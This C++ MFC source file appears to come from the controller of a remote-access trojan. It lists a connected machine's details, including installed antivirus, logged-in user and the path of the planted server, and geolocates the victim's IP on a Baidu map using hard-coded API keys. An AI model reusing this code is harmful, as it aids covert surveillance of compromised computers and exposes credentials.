// Dialogbar.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "Dialogbar.h"
#include "ClientView.h"
#include "PcView.h"
extern 	SEU_QQwry *m_QQwry;
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CDialogbar dialog


CDialogbar * pInfoMation;
CDialogbar::CDialogbar(CWnd* /*pParent /*=NULL*/,ClientContext *pContext)

{
	pInfoMation = this;
	m_pContext = pContext;
}


void CDialogbar::DoDataExchange(CDataExchange* pDX)
{
	CDialogBar::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDialogbar)
	DDX_Control(pDX, IDC_HOSTLIST, m_HostList);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CDialogbar, CDialogBar)
	//{{AFX_MSG_MAP(CDialogbar)
	ON_MESSAGE(WM_INITDIALOG, OnInitDialog)//Dialogbar初始化函数的响应消息
		// NOTE: the ClassWizard will add message map macros here
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDialogbar message handlers
#include <afxwin.h>
#include <afxinet.h>
BOOL GetUpdateInfo(char * strText , char * szurl, char *szstart ,char * szstop)
{
	BOOL bRet = FALSE;
	CString myData;
	char *ip_start = NULL;
	CInternetSession mySession(NULL,0);
	CHttpFile* ChinazHttpFile = NULL;
	ChinazHttpFile = 	(CHttpFile*)mySession.OpenURL(szurl);//str是要打开的地址  
	while(ChinazHttpFile->ReadString(myData)) 		//逐行读取页面数据   
	{
 		if(strstr(myData,szstop)!= 0)
		{
			char  *ip_stop=strstr(myData,szstop);//IP端尾部指针赋值
			*ip_stop='\0';//截断
			
			ip_start=strstr(myData,szstart)+lstrlen(szstart);//ip段开始部分指针赋值
			
			lstrcpy(strText,ip_start);
			
			bRet = TRUE;
			break;
		}
	}
	
	return bRet;
}
CString CDialogbar::htmlmap()
{
	CString html;
	html+="<!doctype html>  \r\n";
	html+="<html>  \r\n";
	html+="<head>  \r\n";
	html+="<meta name=\"viewport\" content=\"initial-scale=1.0, user-scalable=no\" />  \r\n";
	html+="<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\" />  \r\n";
	html+="<title>Baidu Map</title>  \r\n";
	html+="<script type=\"text/javascript\" src=\"http://api.map.baidu.com/api?v=2.0&ak=eqI5HOpUOa8ZEo9F0ipAkGQa\">  \r\n";
	html+="<!-- add baidu map api -->  \r\n";
	html+="</script>  \r\n";
	html+="</head>  \r\n";
	html+="<body>  \r\n";
	html+="<div id=\"container\"   style=\"position: absolute;margin-top:0px; width: 285px; height: 160px; top: 0; border: 0px solid gray;                overflow:hidden;\">	 \r\n";
	html+="</div>\r\n";
	html+="</body>  \r\n";
	html+="</html>  \r\n";
	html+="<script type=\"text/javascript\">  \r\n";
	html+="var map = new BMap.Map(\"container\");                    // new Map\r\n";
    html+="var point = new BMap.Point( " +  m_x + "," + m_y + "); \r\n";
    html+="map.centerAndZoom(point, 2);                           // show Map\r\n";
	html+="map.setZoom(14);   \r\n";
    html+="var mark = new BMap.Marker(point);\r\n";
    html+="map.addOverlay(mark);\r\n";
	
	
	html+="map.addEventListener(\"dbclick\", function (e) \r\n";
	html+="{\r\n";
	html+="alert(e.point.lng + "  "+ e.point.lat);\r\n";
	html+="}\r\n";
	html+=");\r\n";
	html+="map.enableContinuousZoom();    //启用地图惯性拖拽，默认禁用\r\n";

//   html+="map.addControl(new BMap.MapTypeControl());\r\n";   //添加地图类型控件
    // 添加缩放功能  
    html+="map.enableScrollWheelZoom();\r\n";
    html+="map.enableKeyboard();\r\n";
//    html+="map.addControl(new BMap.MapTypeControl());\r\n";
	html+="</script> \r\n";
	html+="<html>\r\n";
	
	return html;
}

int ConvUtf8ToAnsi(CString& strSource, CString& strChAnsi)
{  
    if (strSource.GetLength() <= 0)
        return 0;
    
    CString strWChUnicode;
	
    strSource.TrimLeft();
    strSource.TrimRight();   
    strChAnsi.Empty();
	
    int iLenByWChNeed = MultiByteToWideChar(CP_UTF8, 0,
		strSource.GetBuffer(0),
		strSource.GetLength(), //MultiByteToWideChar
		NULL, 0);
	
    int iLenByWchDone = MultiByteToWideChar(CP_UTF8, 0,
		strSource.GetBuffer(0),
		strSource.GetLength(),
		(LPWSTR)strWChUnicode.GetBuffer(iLenByWChNeed * 2),
		iLenByWChNeed); //MultiByteToWideChar
    
    strWChUnicode.ReleaseBuffer(iLenByWchDone * 2);
	
    int iLenByChNeed  = WideCharToMultiByte(CP_ACP, 0,
		(LPCWSTR)strWChUnicode.GetBuffer(0),
		iLenByWchDone,
		NULL, 0,
		NULL, NULL); 
    
    int iLenByChDone  = WideCharToMultiByte(CP_ACP, 0,
		(LPCWSTR)strWChUnicode.GetBuffer(0),
		iLenByWchDone,
		strChAnsi.GetBuffer(iLenByChNeed),
		iLenByChNeed,
		NULL, NULL);
	
    strChAnsi.ReleaseBuffer(iLenByChDone);
    
    if (iLenByWChNeed != iLenByWchDone || iLenByChNeed != iLenByChDone)
        return 1;
	
    return 0;   
}

LONG CDialogbar::OnInitDialog(UINT wParam, LONG lParam)

{
	BOOL bRet = HandleInitDialog(wParam, lParam);
	if(!UpdateData(FALSE))
	{
		TRACE0("Warning, Unalbe to init update./n");
	}
	// Add Code here
	
	m_HostList.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_HostList.InsertColumn(0, _T("名称"), LVCFMT_LEFT, 100);
	m_HostList.InsertColumn(1, _T("信息"), LVCFMT_LEFT, 200);
	
	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDR_MAINFRAME));	
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_001));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_002));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_003));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_004));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_005));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_006));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_007));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_008));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_009));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_010));

	m_HostList.SetImageList(&m_ImgList,LVSIL_SMALL);	




	m_HostList.InsertItem(0, _T("Cpu信息") , 0);
	m_HostList.InsertItem(1, _T("活动时间"), 1);
	m_HostList.InsertItem(2, _T("杀毒软件"),2);
	m_HostList.InsertItem(3, _T("当前在线用户"),3);
	m_HostList.InsertItem(4, _T("计算机名"),4);
	m_HostList.InsertItem(5, _T("远程端口"),4);
	m_HostList.InsertItem(6, _T("内存大小"),5);
	m_HostList.InsertItem(7, _T("可用内存"),6);
	m_HostList.InsertItem(8, _T("硬盘大小"),7);
	m_HostList.InsertItem(9, _T("可用硬盘大小"),8);
	m_HostList.InsertItem(10, _T("服务端路径"),10);
	
	VERIFY(m_page.CreateFromStatic(IDC_HTMLVIEW, this));
	

	return bRet;
}

void CDialogbar::DeleteList()
{
	m_HostList.DeleteAllItems();	
	int nColumnCount= m_HostList.GetHeaderCtrl()->GetItemCount();
	
	for(int n=0;n<nColumnCount;n++)
	{
		m_HostList.DeleteColumn(0);
	}
}


void CDialogbar::ShowSysinfoList(ClientContext* pContext)
{


	m_pContext = pContext;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	tagSystemInfo m_SysInfo;
	memcpy(&m_SysInfo, (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)) , sizeof(tagSystemInfo));
	
	
	m_HostList.SetRedraw(FALSE);//禁止闪烁
	m_HostList.DeleteAllItems();
	
	CString str;

	m_HostList.InsertItem(0, _T("Cpu信息") , 0);
	m_HostList.InsertItem(1, _T("活动时间"), 1);
	m_HostList.InsertItem(2, _T("杀毒软件"),2);
	m_HostList.InsertItem(3, _T("当前在线用户"),3);
	m_HostList.InsertItem(4, _T("计算机名"),4);
	m_HostList.InsertItem(5, _T("远程端口"),5);
	m_HostList.InsertItem(6, _T("内存大小"),6);
	m_HostList.InsertItem(7, _T("可用内存"),7);
	m_HostList.InsertItem(8, _T("硬盘大小"),8);
	m_HostList.InsertItem(9, _T("可用硬盘大小"),9);
	m_HostList.InsertItem(10, _T("服务端路径"),10);



	m_HostList.SetItemText(0, 1, m_SysInfo.szCpuInfo);//CPU信息
	m_HostList.SetItemText(1, 1, m_SysInfo.szActiveTime);//活动时间
	m_HostList.SetItemText(2, 1, m_SysInfo.szAntiVirus);//杀毒软件
	m_HostList.SetItemText(3, 1, m_SysInfo.szUserName);//当前用户名
	m_HostList.SetItemText(4, 1, m_SysInfo.szPcName);//计算机名
	m_HostList.SetItemText(5, 1, m_SysInfo.szRemotePort);//远程端口
	str.Format("总物理内存:%d MB",m_SysInfo.szMemory);	//内存大小
	m_HostList.SetItemText(6, 1, str);
	str.Format("可用物理内存:%d MB",m_SysInfo.szMemoryFree);	//可用内存
	m_HostList.SetItemText(7, 1, str);
	str.Format("硬盘总容量:%ld GB ",m_SysInfo.szDriveSize);
	m_HostList.SetItemText(8, 1, str);
	str.Format("剩余容量:%ld GB",m_SysInfo.szDriveFreeSize);
	m_HostList.SetItemText(9, 1, str);
	//m_HostList.SetItemText(10, 1, m_SysInfo.szDLLPath);//服务端路径

	//更新窗口
	m_HostList.SetRedraw(TRUE); 
	m_HostList.Invalidate(); 
	m_HostList.UpdateWindow();	

	CString strUrl;
	strUrl.Format("http://api.map.baidu.com/location/ip?ak=eqI5HOpUOa8ZEo9F0ipAkGQa&ip=%s&coor=bd09ll",m_IPAddress);	
	
	try
	{
		char strTitle[100] = {0};
		if (GetUpdateInfo(strTitle,strUrl.GetBuffer(0),"{\"x\":\"","\",\"y\":"))
		{
			m_x = strTitle;
		}
		
		memset(strTitle,0,sizeof(strTitle));
		if (GetUpdateInfo(strTitle,strUrl.GetBuffer(0),"\",\"y\":\"" ,"\"}},\""))
		{
			m_y = strTitle;
		}
	}
	catch (...)
	{
		MessageBox("暂不不支持此IP定位...","温馨提示...",MB_ICONINFORMATION);
		return;
	}
	
	
	
	if (m_x =="" || m_y == "")
	{
		MessageBox("暂不不支持此IP定位...","温馨提示...",MB_ICONINFORMATION);
		return;
	}
	
	char szAppName[MAX_PATH];
	int  len;
	
	::GetModuleFileName(NULL, szAppName, sizeof(szAppName));
	len = strlen(szAppName);
	for(int i=len; i>0; i--)
	{
		if(szAppName[i] == '\\')
		{
			szAppName[i+1] = '\0';
			break;
		}
	}
	strcat(szAppName, "Tools\\map.html");
	
	CFile file;
	
	if (file.Open(szAppName, CFile::modeWrite | CFile::modeCreate))
	{
		file.Write(htmlmap().GetBuffer(0),htmlmap().GetLength());
		file.Close();
	}
	
	CString stradress;
	strUrl.Format("http://api.map.baidu.com/geocoder/v2/?ak=rPtcdxiutc8Fi80QhXx7UDyD&callback=renderReverse&location=%s,%s&output=xml&pois=1",m_y,m_x);
	
	try
	{
		char strTitle[100] = {0};
		if (GetUpdateInfo(strTitle,strUrl.GetBuffer(0),"<formatted_address>","</formatted_address>"))
		{
			
			str = strTitle;
			ConvUtf8ToAnsi(str,stradress);
		}
		
		
		
	}
	catch (...)
	{
		AfxMessageBox("map error2");
		return;
	}
	
	UpdateData(FALSE);
	
	m_page.Navigate2(szAppName);

}



void CDialogbar::ShowSysinfoListDel()
{	
	m_HostList.SetItemText(1, 1, "");
	m_HostList.SetItemText(2, 1, "");
	m_HostList.SetItemText(3, 1, "");
	m_HostList.SetItemText(4, 1, "");
	m_HostList.SetItemText(5, 1, "");
	m_HostList.SetItemText(6, 1, "");
	m_HostList.SetItemText(7, 1, "");
	m_HostList.SetItemText(8, 1, "");
	m_HostList.SetItemText(9, 1, "");
	m_HostList.SetItemText(10, 1, "");
	m_HostList.SetItemText(11, 1, "");
//	m_HostList.SetItemText(12, 1, "");
	//更新窗口
	m_HostList.SetRedraw(TRUE); 
	m_HostList.Invalidate(); 
	m_HostList.UpdateWindow();	
}

